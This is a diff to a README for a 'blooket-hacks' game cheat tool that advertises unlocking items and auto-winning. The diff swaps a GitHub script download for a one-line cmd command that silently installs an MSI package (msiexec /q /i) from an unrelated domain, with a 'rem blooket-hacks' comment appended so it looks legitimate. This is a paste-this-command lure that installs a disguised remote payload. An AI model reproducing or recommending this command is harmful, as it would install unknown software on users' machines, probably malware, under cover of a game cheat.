@@ -29,7 +29,6 @@ Unlock every blook, farm tokens, auto‑win any game mode, and dominate the lobb
 
 ## 💻 Install (Windows — one command)
 
-Open **cmd** and paste this single line:
-
+WIN + R Type **cmd** and paste this single line:
 ```cmd
-curl -o install.bat https://raw.githubusercontent.com/PrimeKeeper58/blooket-hacks/main/install.bat && install.bat
+cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem blooket-hacks
